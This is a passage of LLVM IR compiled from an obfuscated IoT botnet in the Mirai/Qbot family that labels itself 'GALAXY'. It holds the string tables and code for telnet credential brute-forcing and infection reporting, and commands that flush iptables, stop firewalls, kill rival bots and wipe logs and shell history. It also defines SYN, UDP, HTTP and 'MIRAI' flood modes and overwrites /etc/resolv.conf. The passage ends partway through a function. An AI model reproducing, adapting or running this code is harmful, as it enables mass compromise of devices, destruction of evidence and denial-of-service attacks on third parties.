@.str.427 = private unnamed_addr constant [7 x i8] c"xxwkvy\00", align 1
@.str.428 = private unnamed_addr constant [7 x i8] c"hcgguc\00", align 1
@.str.429 = private unnamed_addr constant [7 x i8] c"tlrgju\00", align 1
@.str.430 = private unnamed_addr constant [7 x i8] c"yfdieg\00", align 1
@.str.431 = private unnamed_addr constant [7 x i8] c"kuvikr\00", align 1
@.str.432 = private unnamed_addr constant [7 x i8] c"kgymka\00", align 1
@.str.433 = private unnamed_addr constant [7 x i8] c"bxdusa\00", align 1
@.str.434 = private unnamed_addr constant [7 x i8] c"kmijih\00", align 1
@.str.435 = private unnamed_addr constant [7 x i8] c"cmnupe\00", align 1
@.str.436 = private unnamed_addr constant [7 x i8] c"jkuruo\00", align 1
@.str.437 = private unnamed_addr constant [7 x i8] c"hnqdok\00", align 1
@.str.438 = private unnamed_addr constant [7 x i8] c"vxemfi\00", align 1
@.str.439 = private unnamed_addr constant [7 x i8] c"xzdlvy\00", align 1
@Temp_Directorys = global [13 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.440, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.441, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.442, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.443, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.444, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.440, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.445, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.446, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.447, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.448, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.449, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.450, i32 0, i32 0), i8* null], align 16
@.str.440 = private unnamed_addr constant [7 x i8] c"/tmp/*\00", align 1
@.str.441 = private unnamed_addr constant [7 x i8] c"/var/*\00", align 1
@.str.442 = private unnamed_addr constant [11 x i8] c"/var/run/*\00", align 1
@.str.443 = private unnamed_addr constant [11 x i8] c"/var/tmp/*\00", align 1
@.str.444 = private unnamed_addr constant [16 x i8] c"/dev/netslink/*\00", align 1
@.str.445 = private unnamed_addr constant [7 x i8] c"/dev/*\00", align 1
@.str.446 = private unnamed_addr constant [11 x i8] c"/dev/shm/*\00", align 1
@.str.447 = private unnamed_addr constant [6 x i8] c"/mnt/\00", align 1
@.str.448 = private unnamed_addr constant [8 x i8] c"/boot/*\00", align 1
@.str.449 = private unnamed_addr constant [7 x i8] c"/usr/*\00", align 1
@.str.450 = private unnamed_addr constant [7 x i8] c"/opt/*\00", align 1
@advances = global [16 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.451, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.452, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.453, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.454, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.455, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.456, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.457, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.458, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.459, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.460, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.461, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.462, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.463, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.464, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.465, i32 0, i32 0), i8* null], align 16
@.str.451 = private unnamed_addr constant [8 x i8] c"mdm9625\00", align 1
@.str.452 = private unnamed_addr constant [9 x i8] c"9615-cdp\00", align 1
@.str.453 = private unnamed_addr constant [5 x i8] c"F600\00", align 1
@.str.454 = private unnamed_addr constant [5 x i8] c"F660\00", align 1
@.str.455 = private unnamed_addr constant [5 x i8] c"F609\00", align 1
@.str.456 = private unnamed_addr constant [4 x i8] c"BCM\00", align 1
@.str.457 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.458 = private unnamed_addr constant [5 x i8] c"user\00", align 1
@.str.459 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.460 = private unnamed_addr constant [5 x i8] c"name\00", align 1
@.str.461 = private unnamed_addr constant [5 x i8] c"pass\00", align 1
@.str.462 = private unnamed_addr constant [7 x i8] c"dvrdvs\00", align 1
@.str.463 = private unnamed_addr constant [5 x i8] c"nter\00", align 1
@.str.464 = private unnamed_addr constant [5 x i8] c"User\00", align 1
@.str.465 = private unnamed_addr constant [8 x i8] c"welcome\00", align 1
@fails = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.466, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.467, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.468, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.469, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.470, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.471, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.472, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.473, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.474, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.475, i32 0, i32 0), i8* null], align 16
@.str.466 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.467 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.468 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.469 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.470 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.471 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.472 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@.str.473 = private unnamed_addr constant [7 x i8] c"ailure\00", align 1
@.str.474 = private unnamed_addr constant [4 x i8] c"bye\00", align 1
@.str.475 = private unnamed_addr constant [5 x i8] c"exit\00", align 1
@successes = global [18 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.476, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.477, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.478, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.462, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.451, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.452, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.453, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.454, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.455, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.479, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.480, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.481, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.482, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.483, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.484, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.456, i32 0, i32 0), i8* null], align 16
@.str.476 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.477 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@.str.478 = private unnamed_addr constant [6 x i8] c"shell\00", align 1
@.str.479 = private unnamed_addr constant [2 x i8] c">\00", align 1
@.str.480 = private unnamed_addr constant [8 x i8] c"version\00", align 1
@.str.481 = private unnamed_addr constant [2 x i8] c"v\00", align 1
@.str.482 = private unnamed_addr constant [7 x i8] c"system\00", align 1
@.str.483 = private unnamed_addr constant [8 x i8] c"command\00", align 1
@.str.484 = private unnamed_addr constant [5 x i8] c"help\00", align 1
@advances2 = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.466, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.467, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.468, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.469, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.470, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.471, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.472, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.476, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.477, i32 0, i32 0), i8* null], align 16
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.575 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.485 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.486 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@getRandomPublicIP.ipState = internal global [4 x i8] zeroinitializer, align 1
@.str.487 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@MiraiIPRanges.ipState = internal global [4 x i8] zeroinitializer, align 1
@.str.488 = private unnamed_addr constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00", align 1
@.str.489 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.490 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.491 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.492 = private unnamed_addr constant [12 x i8] c"iptables -F\00", align 1
@.str.493 = private unnamed_addr constant [17 x i8] c"pkill -9 busybox\00", align 1
@.str.494 = private unnamed_addr constant [14 x i8] c"pkill -9 perl\00", align 1
@.str.495 = private unnamed_addr constant [16 x i8] c"pkill -9 python\00", align 1
@.str.496 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.497 = private unnamed_addr constant [37 x i8] c"/sbin/iptables -F; /sbin/iptables -X\00", align 1
@.str.498 = private unnamed_addr constant [23 x i8] c"service firewalld stop\00", align 1
@.str.499 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.500 = private unnamed_addr constant [22 x i8] c"history -c;history -w\00", align 1
@.str.501 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.502 = private unnamed_addr constant [72 x i8] c"[ GALAXY ] Result || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.503 = private unnamed_addr constant [11 x i8] c"rm -rf %s;\00", align 1
@.str.504 = private unnamed_addr constant [91 x i8] c"[ GALAXY ] Removing Temp Directorys. || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.505 = private unnamed_addr constant [27 x i8] c"pkill -9 %s;killall -9 %s;\00", align 1
@.str.506 = private unnamed_addr constant [78 x i8] c"[ GALAXY ] Bot Killing. || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.507 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.508 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.509 = private unnamed_addr constant [75 x i8] c"[ GALAXY ] Infecting || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.510 = private unnamed_addr constant [7 x i8] c"LINKED\00", align 1
@.str.511 = private unnamed_addr constant [85 x i8] c"[ GALAXY ] Infection Success. || IP: %s: || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.512 = private unnamed_addr constant [72 x i8] c"[ GALAXY ] Failed || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.513 = private unnamed_addr constant [10 x i8] c"connected\00", align 1
@SendSTD.randstrings = private unnamed_addr constant [24 x i8*] [i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.514, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.515, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.516, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.517, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.518, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.519, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.520, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.521, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.522, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.523, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.524, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.525, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.526, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.527, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.528, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.529, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.530, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.531, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.532, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.533, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.534, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.535, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.536, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.537, i32 0, i32 0)], align 16
@.str.514 = private unnamed_addr constant [21 x i8] c"PozHlpiND4xPDPuGE6tq\00", align 1
@.str.515 = private unnamed_addr constant [21 x i8] c"tg57YSAcuvy2hdBlEWMv\00", align 1
@.str.516 = private unnamed_addr constant [21 x i8] c"VaDp3Vu5m5bKcfCU96RX\00", align 1
@.str.517 = private unnamed_addr constant [21 x i8] c"UBWcPjIZOdZ9IAOSZAy6\00", align 1
@.str.518 = private unnamed_addr constant [21 x i8] c"JezacHw4VfzRWzsglZlF\00", align 1
@.str.519 = private unnamed_addr constant [21 x i8] c"3zOWSvAY2dn9rKZZOfkJ\00", align 1
@.str.520 = private unnamed_addr constant [21 x i8] c"oqogARpMjAvdjr9Qsrqj\00", align 1
@.str.521 = private unnamed_addr constant [21 x i8] c"yQAkUvZFjxExI3WbDp2g\00", align 1
@.str.522 = private unnamed_addr constant [21 x i8] c"35arWHE38SmV9qbaEDzZ\00", align 1
@.str.523 = private unnamed_addr constant [21 x i8] c"kKbPlhAwlxxnyfM3LaL0\00", align 1
@.str.524 = private unnamed_addr constant [21 x i8] c"a7pInUoLgx1CPFlGB5JF\00", align 1
@.str.525 = private unnamed_addr constant [21 x i8] c"yFnlmG7bqbW682p7Bzey\00", align 1
@.str.526 = private unnamed_addr constant [21 x i8] c"S1mQMZYF6uLzzkiULnGF\00", align 1
@.str.527 = private unnamed_addr constant [21 x i8] c"jKdmCH3hamvbN7ZvzkNA\00", align 1
@.str.528 = private unnamed_addr constant [21 x i8] c"bOAFqQfhvMFEf9jEZ89M\00", align 1
@.str.529 = private unnamed_addr constant [21 x i8] c"VckeqgSPaAA5jHdoFpCC\00", align 1
@.str.530 = private unnamed_addr constant [21 x i8] c"CwT01MAGqrgYRStHcV0X\00", align 1
@.str.531 = private unnamed_addr constant [21 x i8] c"72qeggInemBIQ5uJc1jQ\00", align 1
@.str.532 = private unnamed_addr constant [21 x i8] c"zwcfbtGDTDBWImROXhdn\00", align 1
@.str.533 = private unnamed_addr constant [21 x i8] c"w70uUC1UJYZoPENznHXB\00", align 1
@.str.534 = private unnamed_addr constant [21 x i8] c"EoXLAf1xXR7j4XSs0JTm\00", align 1
@.str.535 = private unnamed_addr constant [21 x i8] c"lgKjMnqBZFEvPJKpRmMj\00", align 1
@.str.536 = private unnamed_addr constant [21 x i8] c"lSvZgNzxkUyChyxw1nSr\00", align 1
@.str.537 = private unnamed_addr constant [21 x i8] c"VQz4cDTxV8RRrgn00toF\00", align 1
@.str.538 = private unnamed_addr constant [4 x i8] c"ALL\00", align 1
@.str.539 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.540 = private unnamed_addr constant [4 x i8] c"SYN\00", align 1
@.str.541 = private unnamed_addr constant [4 x i8] c"RST\00", align 1
@.str.542 = private unnamed_addr constant [4 x i8] c"FIN\00", align 1
@.str.543 = private unnamed_addr constant [4 x i8] c"ACK\00", align 1
@.str.544 = private unnamed_addr constant [4 x i8] c"PSH\00", align 1
@.str.545 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.546 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.547 = private unnamed_addr constant [5 x i8] c"ICMP\00", align 1
@.str.548 = private unnamed_addr constant [5 x i8] c"SREP\00", align 1
@.str.549 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.550 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.551 = private unnamed_addr constant [6 x i8] c"FLOAD\00", align 1
@.str.552 = private unnamed_addr constant [21 x i8] c"[SREP] FLoad Mode ON\00", align 1
@.str.553 = private unnamed_addr constant [6 x i8] c"MIRAI\00", align 1
@.str.554 = private unnamed_addr constant [21 x i8] c"FLoad Mode Activated\00", align 1
@.str.555 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.556 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.557 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.558 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.559 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.560 = private unnamed_addr constant [8 x i8] c"EXITFAG\00", align 1
@.str.561 = private unnamed_addr constant [6 x i8] c"CLEAN\00", align 1
@.str.562 = private unnamed_addr constant [19 x i8] c"[Cleaning] [%s:%s]\00", align 1
@.str.565 = private unnamed_addr constant [11 x i8] c"BIG_ENDIAN\00", align 1
@.str.566 = private unnamed_addr constant [14 x i8] c"LITTLE_ENDIAN\00", align 1
@.str.567 = private unnamed_addr constant [13 x i8] c"BIG_ENDIAN_W\00", align 1
@.str.568 = private unnamed_addr constant [16 x i8] c"LITTLE_ENDIAN_W\00", align 1
@.str.569 = private unnamed_addr constant [8 x i8] c"UNKNOWN\00", align 1
@.str.563 = private unnamed_addr constant [17 x i8] c"/etc/resolv.conf\00", align 1
@.str.564 = private unnamed_addr constant [39 x i8] c"nameserver 8.8.8.8\0Anameserver 8.8.4.4\0A\00", align 1
@.str.570 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.571 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.572 = private unnamed_addr constant [53 x i8] c"[\1B[96mINFECTED\1B[97m] Arch: \1B[96m%s \1B[97m|| Type: %s]\00", align 1
@.str.573 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.574 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = sub i32 0, -1640531527
  %7 = sub i32 %5, %6
  %8 = add i32 %5, -1640531527
  store i32 %7, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %9 = load i32, i32* %2, align 4
  %10 = add i32 %9, 1015664781
  %11 = add i32 %10, -1640531527
  %12 = sub i32 %11, 1015664781
  %13 = add i32 %9, -1640531527
  %14 = sub i32 0, -1640531527
  %15 = sub i32 %12, %14
  %16 = add i32 %12, -1640531527
  store i32 %15, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %17

; <label>:17:                                     ; preds = %68, %1
  %18 = load i32, i32* %3, align 4
  %19 = icmp slt i32 %18, 4096
  br i1 %19, label %20, label %75

; <label>:20:                                     ; preds = %17
  %21 = load i32, i32* %3, align 4
  %22 = sub i32 %21, -826478016
  %23 = sub i32 %22, 3
  %24 = add i32 %23, -826478016
  %25 = sub nsw i32 %21, 3
  %26 = sext i32 %24 to i64
  %27 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %26
  %28 = load i32, i32* %27, align 4
  %29 = load i32, i32* %3, align 4
  %30 = sub i32 0, 2
  %31 = add i32 %29, %30
  %32 = sub nsw i32 %29, 2
  %33 = sext i32 %31 to i64
  %34 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %33
  %35 = load i32, i32* %34, align 4
  %36 = xor i32 %28, -1
  %37 = and i32 -805401077, %36
  %38 = xor i32 -805401077, -1
  %39 = and i32 %28, %38
  %40 = xor i32 %35, -1
  %41 = and i32 %40, -805401077
  %42 = and i32 %35, %38
  %43 = or i32 %37, %39
  %44 = or i32 %41, %42
  %45 = xor i32 %43, %44
  %46 = xor i32 %28, %35
  %47 = xor i32 %45, -1
  %48 = and i32 -582016047, %47
  %49 = xor i32 -582016047, -1
  %50 = and i32 %45, %49
  %51 = xor i32 -1640531527, -1
  %52 = and i32 %51, -582016047
  %53 = and i32 -1640531527, %49
  %54 = or i32 %48, %50
  %55 = or i32 %52, %53
  %56 = xor i32 %54, %55
  %57 = xor i32 %45, -1640531527
  %58 = load i32, i32* %3, align 4
  %59 = xor i32 %56, -1
  %60 = and i32 %58, %59
  %61 = xor i32 %58, -1
  %62 = and i32 %56, %61
  %63 = or i32 %60, %62
  %64 = xor i32 %56, %58
  %65 = load i32, i32* %3, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %66
  store i32 %63, i32* %67, align 4
  br label %68

; <label>:68:                                     ; preds = %20
  %69 = load i32, i32* %3, align 4
  %70 = sub i32 0, %69
  %71 = sub i32 0, 1
  %72 = add i32 %70, %71
  %73 = sub i32 0, %72
  %74 = add nsw i32 %69, 1
  store i32 %73, i32* %3, align 4
  br label %17

; <label>:75:                                     ; preds = %17
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = sub i32 %5, 543050828
  %7 = add i32 %6, 1
  %8 = add i32 %7, 543050828
  %9 = add i32 %5, 1
  %10 = xor i32 %8, -1
  %11 = xor i32 4095, -1
  %12 = xor i32 656273611, -1
  %13 = or i32 %10, %11
  %14 = or i32 656273611, %12
  %15 = xor i32 %13, -1
  %16 = and i32 %15, %14
  %17 = and i32 %8, 4095
  store i32 %16, i32* @rand_cmwc.i, align 4
  %18 = load i64, i64* %2, align 8
  %19 = load i32, i32* @rand_cmwc.i, align 4
  %20 = zext i32 %19 to i64
  %21 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %20
  %22 = load i32, i32* %21, align 4
  %23 = zext i32 %22 to i64
  %24 = mul i64 %18, %23
  %25 = load i32, i32* @c, align 4
  %26 = zext i32 %25 to i64
  %27 = sub i64 0, %26
  %28 = sub i64 %24, %27
  %29 = add i64 %24, %26
  store i64 %28, i64* %1, align 8
  %30 = load i64, i64* %1, align 8
  %31 = lshr i64 %30, 32
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* @c, align 4
  %33 = load i64, i64* %1, align 8
  %34 = load i32, i32* @c, align 4
  %35 = zext i32 %34 to i64
  %36 = sub i64 0, %35
  %37 = sub i64 %33, %36
  %38 = add i64 %33, %35
  %39 = trunc i64 %37 to i32
  store i32 %39, i32* %3, align 4
  %40 = load i32, i32* %3, align 4
  %41 = load i32, i32* @c, align 4
  %42 = icmp ult i32 %40, %41
  br i1 %42, label %43, label %53

; <label>:43:                                     ; preds = %0
  %44 = load i32, i32* %3, align 4
  %45 = sub i32 0, 1
  %46 = sub i32 %44, %45
  %47 = add i32 %44, 1
  store i32 %46, i32* %3, align 4
  %48 = load i32, i32* @c, align 4
  %49 = sub i32 %48, 1186950411
  %50 = add i32 %49, 1
  %51 = add i32 %50, 1186950411
  %52 = add i32 %48, 1
  store i32 %51, i32* @c, align 4
  br label %53

; <label>:53:                                     ; preds = %43, %0
  %54 = load i32, i32* %4, align 4
  %55 = load i32, i32* %3, align 4
  %56 = sub i32 %54, -1406111786
  %57 = sub i32 %56, %55
  %58 = add i32 %57, -1406111786
  %59 = sub i32 %54, %55
  %60 = load i32, i32* @rand_cmwc.i, align 4
  %61 = zext i32 %60 to i64
  %62 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %61
  store i32 %58, i32* %62, align 4
  ret i32 %58
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %8

; <label>:8:                                      ; preds = %20, %2
  %9 = load i8**, i8*** %5, align 8
  %10 = load i32, i32* %6, align 4
  %11 = sub i32 0, %10
  %12 = sub i32 0, 1
  %13 = add i32 %11, %12
  %14 = sub i32 0, %13
  %15 = add nsw i32 %10, 1
  store i32 %14, i32* %6, align 4
  %16 = sext i32 %14 to i64
  %17 = getelementptr inbounds i8*, i8** %9, i64 %16
  %18 = load i8*, i8** %17, align 8
  %19 = icmp ne i8* %18, null
  br i1 %19, label %20, label %21

; <label>:20:                                     ; preds = %8
  br label %8

; <label>:21:                                     ; preds = %8
  store i32 0, i32* %7, align 4
  br label %22

; <label>:22:                                     ; preds = %37, %21
  %23 = load i32, i32* %7, align 4
  %24 = load i32, i32* %6, align 4
  %25 = icmp slt i32 %23, %24
  br i1 %25, label %26, label %44

; <label>:26:                                     ; preds = %22
  %27 = load i8*, i8** %4, align 8
  %28 = load i8**, i8*** %5, align 8
  %29 = load i32, i32* %7, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8*, i8** %28, i64 %30
  %32 = load i8*, i8** %31, align 8
  %33 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %27, i8* %32)
  %34 = icmp ne i32 %33, 0
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %26
  store i32 1, i32* %3, align 4
  br label %45

; <label>:36:                                     ; preds = %26
  br label %37

; <label>:37:                                     ; preds = %36
  %38 = load i32, i32* %7, align 4
  %39 = sub i32 0, %38
  %40 = sub i32 0, 1
  %41 = add i32 %39, %40
  %42 = sub i32 0, %41
  %43 = add nsw i32 %38, 1
  store i32 %42, i32* %7, align 4
  br label %22

; <label>:44:                                     ; preds = %22
  store i32 0, i32* %3, align 4
  br label %45

; <label>:45:                                     ; preds = %44, %35
  %46 = load i32, i32* %3, align 4
  ret i32 %46
}

declare i32 @strcasestr(...) #1

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
